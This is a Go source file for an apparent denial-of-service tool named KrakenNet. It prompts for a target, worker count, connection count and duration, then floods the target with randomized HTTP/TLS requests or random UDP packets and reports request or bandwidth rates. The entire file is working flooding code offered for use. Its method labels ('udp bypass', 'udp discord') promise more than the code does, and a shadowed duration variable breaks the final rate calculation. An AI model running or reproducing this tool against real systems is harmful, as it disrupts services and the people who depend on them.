package pkg

import (
	"bufio"
	"crypto/tls"
	"fmt"
	color "github.com/vexsx/KrakenNet/config"
	"golang.org/x/net/context"
	"golang.org/x/net/http2"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD"}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func newHTTPClientTLS(connections int) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     15 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func sendUDP(conn net.Conn, payload []byte) bool {
	_, err := conn.Write(payload)
	return err == nil
}

func formatBytes(bytes float64) string {
	units := []string{"Bps", "KBps", "MBps", "GBps"}
	i := 0
	for bytes >= 1024 && i < len(units)-1 {
		bytes /= 1024
		i++
	}
	return fmt.Sprintf("%.2f %s", bytes, units[i])
}

func RunAttack() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")

	// get target
	var target string
	var err error
	for {
		fmt.Print(color.Yellow + "🌐 Target (URL or IP): " + color.Reset)
		target, err = reader.ReadString('\n')
		target = strings.TrimSpace(target)

		if err != nil || target == "" {
			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
		} else {

			break
		}
	}

	// get mode
	var mode string
	for {
		// Print available methods
		fmt.Print(color.Green + "🛠 Methods : \n" + color.Reset)
		fmt.Print(color.Yellow + "1-kraken\n2-tls\n3-udp discord\n4-udp bypass\n5-udp gbps\n" + color.Reset)
		fmt.Print(color.Green + "Just enter method number: " + color.Reset)

		mode, err = reader.ReadString('\n')
		mode = strings.TrimSpace(mode) // Remove newline and any extra spaces

		if err != nil {
			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
			continue
		}

		// Convert the mode to an integer
		parsedMode, parseErr := strconv.Atoi(mode)
		if parseErr != nil || !isValidMethod(parsedMode) {
			// If parsing failed or mode is invalid
			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
			continue
		}

		break
	}

	// get connections
	var connections int
	for {
		if mode != "" {
			fmt.Print(color.Yellow + "🔗 Connections per worker: " + color.Reset)

			// Read input from the user
			cStr, err := reader.ReadString('\n')
			if err != nil {
				// Handle the error in input reading
				fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
				continue
			}

			connections, err = strconv.Atoi(strings.TrimSpace(cStr))
			if err != nil {
				// Handle the error if input is not a valid integer
				fmt.Println(color.Red + "Invalid input, please enter a number." + color.Reset)
				continue
			}

			if connections < 1 {
				connections = 10
			}

			break
		}
	}

	// get workers
	var workers int
	for {
		fmt.Print(color.Yellow + "🔧 Number of workers: " + color.Reset)

		wStr, err := reader.ReadString('\n')
		if err != nil {
			// Handle error in input reading
			fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
			continue
		}

		workers, err = strconv.Atoi(strings.TrimSpace(wStr))
		if err != nil {
			// Handle the error if input is not a valid integer
			fmt.Println(color.Red + "Invalid input, please enter a valid number." + color.Reset)
			continue
		}
		if workers < 1 {
			workers = 10
		}

		break
	}

	// get time
	var attackDuration time.Duration
	var durationSec int64
	for {
		// Prompt the user for the duration input
		fmt.Print(color.Yellow + "⏱️ Duration (in seconds): " + color.Reset)

		// Read input from the user
		dStr, err := reader.ReadString('\n')
		if err != nil {
			// Handle error in input reading
			fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
			continue
		}

		// Convert the input to an integer
		durationSec, err := strconv.Atoi(strings.TrimSpace(dStr))
		if err != nil {
			// Handle the error if input is not a valid integer
			fmt.Println(color.Red + "Invalid input, please enter a valid number." + color.Reset)
			continue
		}

		// If the duration is less than 1, set it to 30 seconds
		if durationSec < 1 {
			durationSec = 30
		}

		// Calculate the attack duration
		attackDuration = time.Duration(durationSec) * time.Second

		// Exit the loop after receiving valid input
		break
	}

	var udpPort int
	if mode == "3" || mode == "4" || mode == "5" {
		fmt.Print(color.Yellow + "🎯 UDP Port (target): " + color.Reset)
		portStr, _ := reader.ReadString('\n')
		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
		if udpPort < 1 {
			udpPort = 5000
		}
	}

	fmt.Println(color.Green + "🚀 Attack starting..." + color.Reset)

	var totalSuccess int64
	var totalFail int64
	var totalBytes int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), attackDuration)
	defer cancel()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			switch mode {
			case "1", "2":
				client := newHTTPClientTLS(connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if sendTLSRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}

			case "3", "4", "5":
				conns := make([]net.Conn, connections)
				for i := 0; i < connections; i++ {
					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, udpPort))
					if err != nil {
						continue
					}
					conns[i] = c
				}
				defer func() {
					for _, c := range conns {
						if c != nil {
							c.Close()
						}
					}
				}()

				payloadSize := 1024
				if mode == "5" {
					payloadSize = 8192
				}

				for {
					select {
					case <-ctx.Done():
						return
					default:
						for _, c := range conns {
							if c != nil {
								payload := generatePayload(payloadSize)
								if sendUDP(c, payload) {
									atomic.AddInt64(&totalSuccess, 1)
									atomic.AddInt64(&totalBytes, int64(len(payload)))
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
					}
				}
			}
		}()
	}

	wg.Wait()

	if mode == "2" || mode == "1" {
		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
		rps := float64(total) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success requests : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed requests  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", color.Yellow, rps, color.Reset)
	} else {
		bytes := atomic.LoadInt64(&totalBytes)
		bps := float64(bytes) / float64(durationSec)
		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
		fmt.Printf("%s✅ Success packets : %d%s\n", color.Green, totalSuccess, color.Reset)
		fmt.Printf("%s❌ Failed packets  : %d%s\n", color.Red, totalFail, color.Reset)
		fmt.Printf("%s⏱️ Duration        : %d seconds%s\n", color.Cyan, durationSec, color.Reset)
		fmt.Printf("%s📈 Average BPS     : %s%s\n", color.Yellow, formatBytes(bps), color.Reset)
	}
}

func isValidMethod(mode int) bool {
	validModes := map[int]bool{
		1: true,
		2: true,
		3: true,
		4: true,
		5: true,
	}
	return validModes[mode]
}
